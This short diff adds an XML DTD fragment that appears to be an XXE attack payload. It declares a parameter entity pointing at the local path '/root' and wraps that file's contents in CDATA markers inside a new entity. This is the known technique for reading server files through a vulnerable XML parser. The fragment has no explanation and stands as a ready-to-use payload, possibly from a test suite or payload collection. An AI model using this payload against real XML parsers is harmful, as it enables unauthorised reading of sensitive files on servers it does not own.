@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "/root">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
